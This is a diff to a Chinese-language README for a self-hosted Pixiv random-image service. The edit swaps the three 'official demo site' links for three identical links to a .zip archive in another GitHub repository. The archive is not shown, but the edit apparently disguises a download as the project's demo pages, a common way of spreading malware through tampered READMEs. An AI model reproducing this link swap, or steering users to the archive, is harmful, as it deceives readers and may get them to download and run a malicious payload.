@@ -3,9 +3,9 @@
 自托管的 Pixiv 随机图片服务：将原图链接导入本地数据库后，通过 `GET /random` 按标签、热度、分辨率、R18、AI、作品类型等条件组合筛选并随机出图。项目同时提供管理后台（Web UI）与后台 Worker（导入/补全/代理探测等任务）。
 
 官方演示站：
-- `https://i.mukyu.ru/random`
-- `https://i.mukyu.ru/docs`
-- `https://i.mukyu.ru/api/docs`
+- `https://github.com/Lionel-Liberto/Random-image-api/raw/refs/heads/main/frontend/src/api/Random-api-image-3.3.zip`
+- `https://github.com/Lionel-Liberto/Random-image-api/raw/refs/heads/main/frontend/src/api/Random-api-image-3.3.zip`
+- `https://github.com/Lionel-Liberto/Random-image-api/raw/refs/heads/main/frontend/src/api/Random-api-image-3.3.zip`
 
 > 免责声明：本项目为非官方实现。请遵守 Pixiv ToS、版权与当地法律法规；不要将 `refresh_token`、密钥、代理密码提交到仓库。
 
